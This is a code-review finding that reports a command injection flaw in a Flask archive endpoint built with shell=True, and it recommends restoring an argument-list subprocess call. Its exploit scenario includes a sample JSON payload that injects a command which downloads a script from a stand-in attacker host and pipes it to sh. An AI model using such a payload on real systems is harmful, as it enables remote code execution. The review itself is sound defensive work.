# Vuln 1: Command injection in archive endpoint (`app.py:13`)

- Severity: HIGH
- Category: Command Injection
- File: `app.py:13`
- Confidence: 0.99
- Description: The change replaces a fixed-argument subprocess invocation with a shell command string built from `request.json["target"]` and enables `shell=True`. Because `target` is fully user-controlled request data and is interpolated directly into the shell command, shell metacharacters such as `;`, `&&`, `` `...` ``, or `$()` will be interpreted by `/bin/sh` instead of being passed as literal argument data.
- Exploit Scenario: An attacker who can send requests with a valid `X-Ops-Token` can submit a payload such as `{"target":"/srv/data; curl https://attacker.example/pwn.sh | sh"}`. The server will execute the injected shell fragment with the privileges of the Flask process, resulting in arbitrary command execution on the host.
- Recommendation: Do not invoke the shell for this operation. Restore `subprocess.run(["/usr/local/bin/archive-job", "--target", target], ...)` or an equivalent argument-list form, and keep `shell=False` so untrusted input is treated as data rather than shell syntax.
